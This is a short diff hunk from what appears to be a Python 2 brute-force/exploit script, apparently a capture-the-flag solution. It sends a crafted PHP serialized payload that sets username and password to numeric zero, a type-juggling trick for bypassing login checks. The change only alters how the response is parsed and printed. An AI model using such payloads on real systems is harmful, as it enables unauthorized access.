@@ -61,8 +61,10 @@ for d in range(-1000,100):
         unserialize = "a:2:{s:8:" + '"' + "username" + '"' + ";d:0;s:8:" + '"' + "password" + '"' + ";d:0;}"
         url5 = str(url4 + "&" + "key3=" + unserialize)
         r5 = s.get(url5)
-        print r5.content
-        
+        ft=(r5.content).split('\n')
+        f=ft[3].split('<br>')
+        print f[1]+f[3]+f[4]+f[5] 
+        break
 
         
 
